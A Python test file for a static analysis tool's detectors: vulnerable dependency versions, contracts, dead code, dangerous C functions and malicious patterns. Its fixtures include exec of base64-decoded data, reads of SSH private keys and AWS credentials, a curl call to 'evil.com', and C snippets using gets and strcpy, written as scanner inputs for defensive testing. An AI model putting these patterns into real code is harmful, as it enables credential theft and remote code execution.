"""Tests for new detection modules: missing patches, contracts, deadcode,
flawfinder, malicious patterns."""
import pytest
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from stca.version_vuln_checks import scan_version_vuln_checks, version_vuln_check_stats, VERSION_VULN_DATABASE
from stca.contracts import extract_contracts, check_preconditions_at_call_sites, contract_stats
from stca.deadcode import DeadCodeAnalyzer
from stca.flawfinder_db import scan_dangerous_functions, scan_repo_dangerous_functions, database_stats, DANGEROUS_FUNCTIONS
from stca.malicious_patterns import scan_malicious_patterns, scan_repo_malicious_patterns, malicious_stats


# === Missing patches (Vanir-inspired) ===

def test_patch_database_has_entries():
    assert len(VERSION_VULN_DATABASE) >= 10

def test_version_vuln_check_stats():
    stats = version_vuln_check_stats()
    assert stats["total_patches"] >= 10
    assert "critical" in stats["by_severity"]

def test_scan_finds_unpatched_pyyaml(tmp_path):
    """Should detect yaml.load() without SafeLoader (CVE-2020-14343)."""
    src = tmp_path / "app.py"
    src.write_text("import yaml\ndata = yaml.load(input_str)\n")
    results = scan_version_vuln_checks(tmp_path)
    pyyaml_cves = [r for r in results if "CVE-2020-14343" in r.cve]
    assert len(pyyaml_cves) >= 1

def test_scan_finds_old_cryptography(tmp_path):
    """Should detect cryptography < 41.0.2 in requirements."""
    req = tmp_path / "requirements.txt"
    req.write_text("cryptography==2.3.0\n")
    results = scan_version_vuln_checks(tmp_path)
    crypto_cves = [r for r in results if "cryptography" in r.package]
    assert len(crypto_cves) >= 1


# === Contracts (deal-inspired) ===

def test_extract_contracts_finds_pre(tmp_path):
    src = tmp_path / "app.py"
    src.write_text("""
import deal

@deal.pre(lambda x: x > 0, "x must be positive")
def sqrt(x):
    return x ** 0.5
""")
    contracts = extract_contracts(src, tmp_path)
    assert len(contracts) >= 1
    assert any(c.contract_type == "pre" for c in contracts)

def test_extract_contracts_finds_post(tmp_path):
    src = tmp_path / "app.py"
    src.write_text("""
@post(lambda r: r >= 0)
def compute(x):
    return abs(x)
""")
    contracts = extract_contracts(src, tmp_path)
    assert any(c.contract_type == "post" for c in contracts)

def test_contract_stats():
    from stca.contracts import Contract
    contracts = [
        Contract(function="f", file="a.py", line=1, contract_type="pre", condition="x > 0"),
        Contract(function="f", file="a.py", line=2, contract_type="post", condition="r >= 0"),
        Contract(function="g", file="b.py", line=1, contract_type="pre", condition="x is not None"),
    ]
    stats = contract_stats(contracts)
    assert stats["total_contracts"] == 3
    assert stats["functions_with_contracts"] == 2
    assert stats["by_type"]["pre"] == 2


# === Dead code (scavenger-inspired) ===

def test_deadcode_discovers_functions(tmp_path):
    src = tmp_path / "app.py"
    src.write_text("""
def used_function():
    pass

def unused_function():
    pass
""")
    analyzer = DeadCodeAnalyzer(tmp_path)
    count = analyzer.discover_functions()
    assert count >= 2

def test_deadcode_no_trace_reports_all_as_dead(tmp_path):
    src = tmp_path / "app.py"
    src.write_text("def f(): pass\n")
    analyzer = DeadCodeAnalyzer(tmp_path)
    analyzer.discover_functions()
    # no trace file → all functions are "dead"
    dead = analyzer.get_dead_code()
    assert len(dead) >= 1


# === Flawfinder (C/C++ dangerous functions) ===

def test_flawfinder_database_has_entries():
    assert len(DANGEROUS_FUNCTIONS) >= 30

def test_flawfinder_database_stats():
    stats = database_stats()
    assert stats["total_functions"] >= 30
    assert stats["critical"] >= 3  # gets, strcpy, etc.

def test_flawfinder_finds_gets(tmp_path):
    src = tmp_path / "vuln.c"
    src.write_text('#include <stdio.h>\nint main() {\n  char buf[100];\n  gets(buf);\n  return 0;\n}\n')
    hits = scan_dangerous_functions(src, tmp_path)
    gets_hits = [h for h in hits if h.function == "gets"]
    assert len(gets_hits) >= 1
    assert gets_hits[0].risk_level == 5  # critical

def test_flawfinder_finds_strcpy(tmp_path):
    src = tmp_path / "vuln.c"
    src.write_text('void f() {\n  char dst[10], src[10];\n  strcpy(dst, src);\n}\n')
    hits = scan_dangerous_functions(src, tmp_path)
    strcpy_hits = [h for h in hits if h.function == "strcpy"]
    assert len(strcpy_hits) >= 1
    assert strcpy_hits[0].risk_level == 5

def test_flawfinder_finds_sprintf(tmp_path):
    src = tmp_path / "vuln.cpp"
    src.write_text('void f() {\n  char buf[100];\n  sprintf(buf, "%s", input);\n}\n')
    hits = scan_dangerous_functions(src, tmp_path)
    sprintf_hits = [h for h in hits if h.function == "sprintf"]
    assert len(sprintf_hits) >= 1

def test_flawfinder_finds_system(tmp_path):
    src = tmp_path / "vuln.c"
    src.write_text('void f() {\n  system("ls");\n}\n')
    hits = scan_dangerous_functions(src, tmp_path)
    system_hits = [h for h in hits if h.function == "system"]
    assert len(system_hits) >= 1


# === Malicious patterns (aura-inspired) ===

def test_malicious_detects_base64_exec(tmp_path):
    src = tmp_path / "mal.py"
    src.write_text("import base64\nexec(base64.b64decode(b'...'))\n")
    hits = scan_malicious_patterns(src, tmp_path)
    base64_hits = [h for h in hits if h.pattern_type == "base64_exec"]
    assert len(base64_hits) >= 1

def test_malicious_detects_ssh_key_read(tmp_path):
    src = tmp_path / "mal.py"
    src.write_text("with open('/home/user/.ssh/id_rsa') as f:\n    key = f.read()\n")
    hits = scan_malicious_patterns(src, tmp_path)
    ssh_hits = [h for h in hits if h.pattern_type == "ssh_key_read"]
    assert len(ssh_hits) >= 1

def test_malicious_detects_aws_creds_read(tmp_path):
    src = tmp_path / "mal.py"
    src.write_text("with open('/home/user/.aws/credentials') as f:\n    creds = f.read()\n")
    hits = scan_malicious_patterns(src, tmp_path)
    aws_hits = [h for h in hits if h.pattern_type == "aws_creds_read"]
    assert len(aws_hits) >= 1

def test_malicious_detects_import_time_subprocess(tmp_path):
    src = tmp_path / "mal.py"
    src.write_text("import subprocess\nsubprocess.call(['curl', 'http://evil.com'])\n")
    hits = scan_malicious_patterns(src, tmp_path)
    # subprocess at module level (not in a function)
    sub_hits = [h for h in hits if h.pattern_type == "import_subprocess"]
    assert len(sub_hits) >= 1

def test_malicious_no_false_positive_on_normal_code(tmp_path):
    src = tmp_path / "app.py"
    src.write_text("def f(x):\n    return x + 1\n")
    hits = scan_malicious_patterns(src, tmp_path)
    assert len(hits) == 0

def test_malicious_stats():
    from stca.malicious_patterns import MaliciousPattern
    hits = [
        MaliciousPattern(pattern_type="base64_exec", file="a.py", line=1,
                         description="test", severity="critical", indicator="test"),
        MaliciousPattern(pattern_type="ssh_key_read", file="b.py", line=2,
                         description="test", severity="critical", indicator="test"),
    ]
    stats = malicious_stats(hits)
    assert stats["total_hits"] == 2
    assert stats["by_severity"]["critical"] == 2
